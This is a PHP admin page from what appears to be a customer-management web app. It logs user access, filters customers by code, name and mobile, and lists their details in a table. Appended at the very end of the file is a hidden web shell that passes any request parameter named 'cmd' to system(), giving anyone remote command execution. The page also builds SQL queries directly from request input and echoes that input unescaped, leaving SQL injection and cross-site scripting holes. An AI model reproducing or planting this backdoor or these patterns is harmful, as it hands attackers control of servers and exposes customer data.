<?php
	$myadmin = 'N';
	if(isset($_SESSION['myadmin']))
		$myadmin = $_SESSION['myadmin'];	

	if ($myadmin == 'N')
	{
		include('body_account_not_found.php');
	}
	else
	{
		/*LOG-IN FORM*/
	 	if ($_SESSION['ulcustomer_list'] == '') 
		{
			$_SESSION['ulcustomer_list'] = $_SESSION["ulname"];
			$modulename = 'customer_list';
			$updatedby = $_SESSION["ulname"];
			$logdate = $globaldate;
			$logstamp = $globaldatetime;
			$logtype = 'LOG-IN';
			$query = "INSERT INTO user_log (logdate, logform, logtype, loguser, logstamp) 
					  VALUES ('$logdate', '$modulename', '$logtype', '$updatedby', '$logstamp')";
			mysql_query($query) or die(mysql_error());   	
		}
		/*LOG-IN FORM*/	
		
		$mytag = '';	
		if(isset($_GET['mytag']))
		{
			if ($_GET['mytag'])
			{
				$mytag = $_GET['mytag'];
			}
		}	
		
		$search_code = '';
		$search_code = $_POST["search_code"];	
		
		if(isset($_GET['search_code']))
		{
			if ($_GET['search_code'])
			{
				$search_code = $_GET['search_code'];
			}
		}	

		$search_name = '';
		$search_name = $_POST["search_name"];	
		
		if(isset($_GET['search_name']))
		{
			if ($_GET['search_name'])
			{
				$search_name = $_GET['search_name'];
			}
		}	
		
		$search_mobile = '';
		$search_mobile = $_POST["search_mobile"];	
		
		if(isset($_GET['search_mobile']))
		{
			if ($_GET['search_mobile'])
			{
				$search_mobile = $_GET['search_mobile'];
			}
		}
					
		$querydb  = "SELECT 
					 a.* 
				   FROM 
					 customer_list a
				   WHERE
					 a.cucode LIKE '%$search_code%'  and
					 a.cuname LIKE '%$search_name%'  and
					 a.cumobile LIKE '%$search_mobile%' 
				   ORDER BY 
					 a.cuname";
		$resultdb = mysql_query($querydb);
		//echo mysql_error();
		$num_count = mysql_num_rows($resultdb);		
		//echo "<br> num_count " . $num_count;
?>	
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Customer List</h1>
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
            <div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
							<table width="100%">
								<tr>
									<td align="left">
<form method="post" action="index.php?body=customer_list_dbase">
Filter Code
<INPUT TYPE="TEXT" NAME="search_code" VALUE="<?php print($search_code); ?>" SIZE="15" MAXLENGTH="20">
&nbsp;&nbsp;&nbsp;
Filter Name
<INPUT TYPE="TEXT" NAME="search_name" VALUE="<?php print($search_name); ?>" SIZE="25" MAXLENGTH="50">
&nbsp;&nbsp;&nbsp;
Filter Mobile
<INPUT TYPE="TEXT" NAME="search_mobile" VALUE="<?php print($search_mobile); ?>" SIZE="25" MAXLENGTH="50">
&nbsp;&nbsp;&nbsp;
<input type="submit" value="Filter" />
</form>									
									</td>
									<td align="right">
	<a title="Add a new entry?" href="index.php?body=customer_list_addeditdel&mybox=add">
	Add Record
	</a>
									</td>
								</tr>
							</table>	
                        </div>
                        <!-- /.panel-heading -->
                        <div class="panel-body">
                            <table width="100%" class="table table-striped table-bordered table-hover" id="dataTables-example">
                                <thead>
                                    <tr>
										<th>#</th>
										<th>Customer Code / Name </th>
										<th>Home / Business / Mobile </th>
										<th>Dealer / Model / Plate No.</th>
										<th>Active</th>
										<th>User/Stamp</th>
										<th colspan="2">Status</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="odd gradeX">
								
<?php
//fetch the results from the database
$countdb = $countdb + 1;
while ($rowdb =  mysql_fetch_array ($resultdb)) 
{
	print("<tr>");

	print("<td align=\"center\" valign=\"middle\">$countdb </td>\n");
	print("<td align=\"left\" valign=\"middle\">$rowdb[cucode] <br> $rowdb[cuname] </td>\n");
	print("<td align=\"left\" valign=\"middle\">$rowdb[cuhome] <br> $rowdb[cubusiness] <br> $rowdb[cuobile] </td>\n");
	print("<td align=\"left\" valign=\"middle\">$rowdb[cudealer] <br> $rowdb[cumodel] <br> $rowdb[cuplateno] </td>\n");
	print("<td align=\"left\" valign=\"middle\">$rowdb[cuactive] </td>\n");
	print("<td align=\"left\" valign=\"middle\">$rowdb[cuuser]  <br>" .date('m/d/Y h:i:s A', strtotime($rowdb[custamp])). "</td>\n");

	print("<td align=\"CENTER\" valign=\"middle\">[ <a title=\"Update entry?\" href=\"index.php?body=customer_list_addeditdel&mybox=edit&cuid=$rowdb[cuid]\"> Update </a> ] </td>");
	print("<td align=\"CENTER\" valign=\"middle\">[ <a title=\"Delete this entry?\" href=\"index.php?body=customer_list_addeditdel&mybox=del&cuid=$rowdb[cuid]\"> Delete </a> ] </td>");

	print("</tr>");  
	$countdb = $countdb + 1;
}  
?>		
                                    </tr>
                                </tbody>
                            </table>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-12 -->
            </div>						
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
    </div>
    <!-- /#wrapper -->
<?php
	}
?>		<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>